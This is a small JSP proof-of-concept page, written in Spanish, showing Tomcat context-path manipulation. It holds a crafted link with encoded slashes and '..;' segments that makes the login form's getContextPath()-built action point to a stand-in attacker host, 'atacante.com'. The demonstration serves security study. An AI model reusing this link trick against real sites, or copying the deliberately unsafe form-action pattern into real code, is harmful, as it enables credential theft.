<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>POC JSP ContextPath Link Manipulation - XSS</title>
    </head>
    <body>
        <h1>Prueba de concepto: JSP ContextPath Link Manipulation - XSS</h1>
        Requisitos:
        <ul>
            <li>Ejecutar en servidor Tomcat</li>
            <li>La URL se construye usando request.getContextPath()</li>
        </ul>
        
        <b><a href="/&amp;sol;atacante.com/login.jsp&amp;num;/..;/..;/seguridadjava/contextpath-manipulation.jsp">URL manipulada</a></b>
        <br/><br/>
        <form action="<%= request.getContextPath() + "/contextpath-manipulation.jsp" %>" method="post">
            username: <input type="text" name="username"><br/>
            password: <input type="password" name="password"><br/>
            <input type="submit" value="Login"/>
        </form>
        <br/>
        <p> <c:out value="${param.username}"/></p>
    </body>
</html>